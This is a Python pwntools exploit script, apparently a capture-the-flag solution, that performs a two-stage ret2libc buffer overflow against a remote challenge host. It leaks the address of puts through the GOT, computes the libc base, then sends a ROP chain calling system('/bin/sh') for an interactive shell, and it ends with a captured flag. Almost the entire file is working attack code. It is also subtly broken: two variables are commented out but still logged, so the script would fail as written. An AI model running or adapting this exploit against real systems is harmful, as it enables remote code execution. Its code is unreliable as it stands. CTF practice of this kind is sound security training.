#!/usr/bin/env python3
from pwn import *
"""
The idea here is to perform a ret2libc attack developed in 2 steps, first we calculate the libc base addres throught the puts function, 
in fact we are able to print the got address of the puts function starting from the plt address
(which is a pointer to the got table that contanin the actual addresses) and then compute the libc base. 
At this point we are able to compose a valid ROP chain to spawn a shell

"""
context.binary = elf = ELF('./ret2libc_home', checksec=False)
context.log_level = 'debug'
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(elf)
#rop.print_gadgets()
HOST,PORT="offsec.m0lecon.it",13553
OFFSET_TO_RIP =136


#============== 1 STAGE: LIBC_BASE  ==================#
#The idea is to leak an address of libc(specifically the puts), through the got table, in fact the binary contain the plt address which are the "pointer" on the got table where the actual address are stored.
POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
RET       = rop.find_gadget(['ret'])[0]
#PRINT_PLT  = elf.plt['printf']
#PRINT_GOT  = elf.got['printf']
MAIN      = elf.sym['main']

PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']

log.info(f"POP_RDI:{hex(POP_RDI)}")
log.info(f"RET:{hex(RET)}")
log.info(f"PRINT_PLT:{hex(PRINT_PLT)}")
log.info(f"PRINT_GOT:{hex(PRINT_GOT)}")
log.info(f"PUTS_PLT:{hex(PUTS_PLT)}")
log.info(f"PUTS_GOT:{hex(PUTS_GOT)}")
log.info(f"MAIN:{hex(MAIN)}")

#p = process(elf.path)
p= remote(HOST,PORT)

# -------- Stage 1: leak puts --------
#p.recvuntil(b'Tell me your wish: ')
p.recv()
stage1 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(POP_RDI),       #<-- metto in RDI (primo paramentro delle funzioni) quello che segue dopo
    p64(PUTS_GOT),      #<--- setto come parametro puts@got 
    p64(PUTS_PLT),      #<-- chiamo la funzione puts, e come parametro puts@plt (puts(puts@got)) 
    p64(MAIN),          #<-- ritorno il controllo a main()
)

p.sendline(stage1)
p.recvuntil("sent!\n")            # consume "Postcard sent!\n"


leaked = p.recvline().strip()
leak_puts = u64(leaked.ljust(8, b'\x00'))
log.info(f"puts leak = {leak_puts:#x}")
libc_base=leak_puts - libc.symbols['puts'] 
#libc_base=libc_base & ~0xfff 
libc.address = libc_base

log.info(f"libc base = {libc.address:#x}")

#============== 2 STAGE: CALL system(/bin/sh\) ==================#
#Now i can retreive the gadget needed from the libc (nowi have the right addresses) and the binary itself, in order to compose a valid rop cahin that spawn a shell
SYSTEM = libc.symbols['system']

BINSH= next(libc.search(b'/bin/sh\x00'))
log.info(f"system_addr:{hex(SYSTEM)}")

log.info(f"BINSH:{hex(BINSH)}")
p.recv()
stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),   #alignment
    p64(POP_RDI),   #<-- metto in RDI (primo paramentro delle funzioni) quello che segue dopo
    p64(BINSH),     #<--- setto come parametro /bin/sh
    p64(SYSTEM),    #<-- chiamo system("/bin/sh")

    
)

p.sendline(stage2)
p.interactive()

#offsec{sp3c14l_d3l1v3ry_hxltgB2e3JMhtXYw}

